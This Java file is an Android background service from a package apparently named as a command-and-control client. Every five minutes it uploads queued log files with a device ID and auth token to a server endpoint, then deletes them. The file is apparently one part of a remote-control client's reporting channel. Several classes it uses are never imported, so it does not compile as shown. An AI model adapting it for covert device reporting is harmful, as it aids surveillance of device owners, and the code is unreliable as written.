package com.astra.c2client;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class LogUploadService extends Service {
    private static final String TAG = "AstraC2-LogUpload";
    private static final int UPLOAD_INTERVAL_SECONDS = 300; // 5 minutes
    
    private ScheduledExecutorService scheduler;
    private SharedPreferences sharedPreferences;
    private boolean isRunning = false;
    
    private File logDir;
    private List<File> pendingLogs;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "LogUploadService created");
        scheduler = Executors.newSingleThreadScheduledExecutor();
        sharedPreferences = getSharedPreferences(Config.PREFS_NAME, MODE_PRIVATE);
        
        // Initialize log directory
        logDir = new File(getFilesDir(), "logs");
        if (!logDir.exists()) {
            logDir.mkdirs();
        }
        
        pendingLogs = new ArrayList<>();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "LogUploadService started");
        
        if (!isRunning) {
            startLogUploader();
            isRunning = true;
        }
        
        return START_STICKY;
    }
    
    private void startLogUploader() {
        // Schedule the log upload task
        scheduler.scheduleAtFixedRate(
            this::uploadPendingLogs,
            30, // wait 30 seconds before first upload
            UPLOAD_INTERVAL_SECONDS,
            TimeUnit.SECONDS
        );
        
        logToMain("Log upload service started, interval: " + UPLOAD_INTERVAL_SECONDS + " seconds");
    }
    
    private void uploadPendingLogs() {
        try {
            // Check if device is registered
            String deviceId = sharedPreferences.getString(Config.PREF_DEVICE_ID, null);
            String authToken = sharedPreferences.getString(Config.PREF_AUTH_TOKEN, null);
            
            if (deviceId == null || authToken == null) {
                logToMain("Device not registered. Cannot upload logs.");
                return;
            }
            
            // Scan for pending log files
            scanPendingLogs();
            
            if (pendingLogs.isEmpty()) {
                Log.d(TAG, "No pending logs to upload");
                return;
            }
            
            logToMain("Found " + pendingLogs.size() + " pending logs to upload");
            
            // Upload each log file
            for (File logFile : pendingLogs) {
                uploadLogFile(deviceId, authToken, logFile);
            }
            
            // Clear the list after uploading
            pendingLogs.clear();
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error in log upload", e);
        }
    }
    
    private void scanPendingLogs() {
        pendingLogs.clear();
        
        if (logDir.exists() && logDir.isDirectory()) {
            File[] files = logDir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isFile() && file.getName().endsWith(".log")) {
                        pendingLogs.add(file);
                    }
                }
            }
        }
    }
    
    private void uploadLogFile(String deviceId, String authToken, File logFile) {
        try {
            // Read log file content
            String content = readFileContent(logFile);
            
            // Parse log metadata from filename
            String filename = logFile.getName();
            String[] parts = filename.split("_");
            String logType = "other";
            
            if (parts.length >= 2) {
                logType = parts[0];
            }
            
            // Prepare request parameters
            Map<String, String> params = new HashMap<>();
            params.put("device_id", deviceId);
            params.put("auth_token", authToken);
            params.put("type", logType);
            params.put("content", content);
            
            // Send the log
            JSONObject response = ApiClient.sendPostRequest(Config.ENDPOINT_SEND_LOG, params);
            
            if (response.has("status") && response.getString("status").equals("success")) {
                // Log uploaded successfully, delete the file
                logFile.delete();
                Log.d(TAG, "Log file uploaded and deleted: " + filename);
            } else {
                logToMain("Failed to upload log file: " + filename);
            }
        } catch (IOException | JSONException e) {
            logToMain("Error uploading log file: " + e.getMessage());
            Log.e(TAG, "Error uploading log file", e);
        }
    }
    
    private String readFileContent(File file) throws IOException {
        byte[] bytes = new byte[(int) file.length()];
        java.io.FileInputStream fis = new java.io.FileInputStream(file);
        fis.read(bytes);
        fis.close();
        return new String(bytes);
    }
    
    private void logToMain(String message) {
        Log.d(TAG, message);
        
        Intent intent = new Intent(Config.ACTION_LOG_MESSAGE);
        intent.putExtra(Config.EXTRA_LOG_MESSAGE, message);
        sendBroadcast(intent);
        
        // Update MainActivity log directly if it's in foreground
        if (MainActivity.isActive()) {
            MainActivity mainActivity = MainActivity.getInstance();
            if (mainActivity != null) {
                mainActivity.appendToLog(message);
            }
        }
    }
    
    @Override
    public void onDestroy() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
            logToMain("Log upload service stopped");
        }
        
        isRunning = false;
        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    // Static method to queue a log for later upload
    public static void queueLog(Context context, String type, String content) {
        try {
            // Create logs directory if needed
            File logDir = new File(context.getFilesDir(), "logs");
            if (!logDir.exists()) {
                logDir.mkdirs();
            }
            
            // Create log file with timestamp
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            File logFile = new File(logDir, type + "_" + timestamp + ".log");
            
            // Write content to file
            java.io.FileOutputStream fos = new java.io.FileOutputStream(logFile);
            fos.write(content.getBytes());
            fos.close();
            
            Log.d(TAG, "Log queued for upload: " + logFile.getName());
        } catch (IOException e) {
            Log.e(TAG, "Error queueing log", e);
        }
    }
}
